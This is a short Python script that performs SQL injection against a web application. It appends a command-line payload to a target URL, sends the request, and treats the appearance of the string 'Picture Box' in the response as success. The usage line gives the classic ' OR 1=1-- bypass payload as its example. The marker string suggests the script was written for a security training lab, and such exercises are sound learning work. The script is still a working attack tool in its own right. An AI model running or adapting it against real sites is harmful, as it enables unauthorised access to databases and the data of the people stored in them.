#!/usr/bin/env python3
import sys
import requests

def exploit_sqli(url, payload):
    r = requests.get(url+payload)
    if "Picture Box" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print("[*] Usage: {} <url> <payload>".format(sys.argv[0]))
        print('[*] Example: {} http://example.com "\' OR 1=1-- "'.format(sys.argv[0]))
        sys.exit(1)

    if exploit_sqli(url, payload):
        print("[*] SQL injection successful.")
    else:
        print("[*] SQL injection not successful.")
